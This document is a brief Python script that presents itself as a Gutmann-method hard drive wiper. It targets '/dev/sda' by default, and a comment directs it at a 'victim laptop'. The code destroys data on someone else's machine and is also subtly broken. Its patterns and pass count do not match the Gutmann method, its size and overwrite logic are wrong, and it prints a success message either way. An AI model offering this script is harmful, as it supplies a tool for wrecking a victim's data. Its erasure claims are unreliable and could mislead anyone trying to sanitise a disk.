import os

def wipe_hard_drive_gutmann(drive_path):
    try:
        # Gutmann method data patterns
        patterns = [
            b'\x55' * 4, b'\xAA' * 4, b'\x92\x49\x24' * 4,
            b'\x49\x24\x92' * 4, b'\x24\x92\x49' * 4, b'\x00' * 4,
            b'\x11' * 4, b'\x22' * 4, b'\x33' * 4, b'\x44' * 4,
            b'\x55' * 4, b'\x66' * 4, b'\x77' * 4, b'\x88' * 4,
            b'\x99' * 4, b'\xAA' * 4, b'\xBB' * 4, b'\xCC' * 4,
            b'\xDD' * 4, b'\xEE' * 4, b'\xFF' * 4
        ]

        with open(drive_path, 'wb') as file:
            drive_size = os.path.getsize(drive_path)
            num_passes = 35
            for _ in range(num_passes):
                for pattern in patterns:
                    file.write(pattern * (drive_size // len(pattern)))

        print(f"Drive at {drive_path} has been securely wiped by yours sincerely.")

    except Exception as e:
        print(f"An error occurred: {e}")

# Replace 'drive_path' with the path to the victim laptop's hard drive (e.g., '/dev/sda' on Linux, 'C:/Users/NameOfUser" on windows)
drive_path = '/dev/sda'  # Please be extremely cautious and double-check the drive path!
wipe_hard_drive_gutmann(drive_path)
